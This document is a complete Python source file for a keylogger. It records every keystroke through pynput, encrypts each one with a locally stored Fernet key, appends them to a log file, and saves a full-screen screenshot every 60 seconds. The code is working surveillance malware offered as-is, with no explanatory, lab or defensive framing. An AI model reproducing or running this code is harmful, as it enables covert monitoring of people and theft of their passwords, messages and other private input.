from cryptography.fernet import Fernet
import os
import time
from pynput import keyboard
from PIL import ImageGrab

# Load or generate encryption key
key_path = os.path.abspath("key.key")
if not os.path.exists(key_path):
    key = Fernet.generate_key()
    with open(key_path, "wb") as key_file:
        key_file.write(key)
else:
    with open(key_path, "rb") as key_file:
        key = key_file.read()
cipher_suite = Fernet(key)

log_file = os.path.abspath("encrypted_key_log.txt")
screenshot_dir = os.path.abspath("screenshots")

# Create screenshots directory if it doesn't exist
if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)

def on_press(key):
    try:
        with open(log_file, "ab") as f:
            encrypted_data = cipher_suite.encrypt(str(key).encode())
            f.write(encrypted_data + b'\n')
    except Exception as e:
        print(f"Error writing key log: {e}")

def take_screenshot():
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
    ImageGrab.grab().save(screenshot_path, "PNG")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    try:
        while True:
            take_screenshot()
            time.sleep(60)  # Take screenshot every 60 seconds
    except KeyboardInterrupt:
        listener.stop()

if __name__ == "__main__":
    start_keylogger()
